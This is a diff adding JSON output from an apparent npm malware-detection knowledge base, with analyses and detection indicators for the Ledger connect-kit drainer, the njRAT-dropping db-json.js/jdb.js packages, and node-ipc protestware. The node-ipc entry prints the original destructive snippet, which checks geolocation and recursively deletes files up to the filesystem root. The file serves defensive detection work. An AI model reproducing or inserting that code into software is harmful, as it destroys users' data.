+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787389_snippet_1",
+              "source_package": "db-json.js, jdb.js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787389/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4194257855415344,
+              "code_similarity": 0.45267602801322937,
+              "behavior_similarity": 0.3861755430698395,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"dependencies\": {\n  \"lodash\": \"^4.17.19\",\n  \"promise-fs\": \"^2.1.1\",\n  \"jdb.js\": \"1.0.0\"\n}",
+                "code_behavior": "At install-time, the package.json file specifies jdb.js as a dependency, causing npm to automatically download and install the malicious jdb.js package, which initiates the attack chain.",
+                "malice_analysis": {
+                  "why_suspicious": "The package introduces a dependency on an obscure, attacker-controlled package (jdb.js) that is not required for legitimate JSON database operations, enabling the delivery of malicious payloads.",
+                  "violated_expectations": "Legitimate npm packages only depend on well-known, trusted libraries. Introducing a hidden or unrelated dependency to a package with no clear functional purpose is highly abnormal and a common malware delivery tactic.",
+                  "similar_legitimate_use": "Legitimate packages may depend on other utilities, but dependencies are typically well-documented, widely used, and relevant to the package's stated functionality.",
+                  "key_indicators": [
+                    "Obscure dependency (jdb.js) with no legitimate purpose",
+                    "Dependency chain used to introduce malware",
+                    "No documentation or community presence for the dependency"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "install-time",
+                  "file_location": "db-json.js/package.json",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "db-json.js, jdb.js",
+                  "package_manager": "npm",
+                  "package_versions": "db-json.js: 1.0.3, 1.0.4; jdb.js: 1.0.0",
+                  "why_malicious": "These packages impersonate legitimate JSON database utilities but are engineered to covertly install and execute the njRAT remote access trojan. This grants attackers persistent, full remote control over the victim's system, enabling data theft, surveillance, and further compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs db-json.js, which automatically installs jdb.js as a dependency via package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code in jdb.js is downloaded and prepared for execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Obfuscated JavaScript in jdb.js executes patch.exe (njRAT) during installation using child_process.exec.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "njRAT is installed and launched on the victim's system."
+                  },
+                  {
+                    "step": 3,
+                    "action": "njRAT establishes a remote connection, granting the attacker full control over the victim's computer.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker can perform a wide range of malicious actions, including data theft, surveillance, and system manipulation."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated JavaScript code present in npm package files (e.g., module.js)",
+                    "Execution of bundled .exe files (such as patch.exe) during npm install or postinstall scripts",
+                    "Unexpected process creation (e.g., child_process.exec launching Windows executables) during package installation",
+                    "Installation of unknown or obscure dependencies (e.g., jdb.js) with no clear functional purpose",
+                    "Immediate outbound network connections following npm package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of patch.exe or similar executables within node_modules directories",
+                    "Obfuscated or minified module.js files in npm packages",
+                    "package.json files declaring suspicious or unknown dependencies (such as jdb.js)",
+                    "Unusual executable files (e.g., .exe) bundled within JavaScript packages"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known njRAT command-and-control (C2) servers",
+                    "Unusual or unauthorized network traffic immediately after npm install",
+                    "Connections to suspicious IP addresses or domains associated with njRAT infrastructure"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for execution of binaries or obfuscated scripts, especially via postinstall hooks or child_process. Flag packages that declare dependencies on obscure or unrelated modules (e.g., jdb.js). Scan node_modules for the presence of known RAT executables (such as patch.exe) and obfuscated JavaScript files. Use network monitoring to detect connections to known njRAT C2 infrastructure or unexpected outbound traffic immediately after package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41765499114990234,
+              "code_similarity": 0.3749600052833557,
+              "behavior_similarity": 0.460349977016449,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
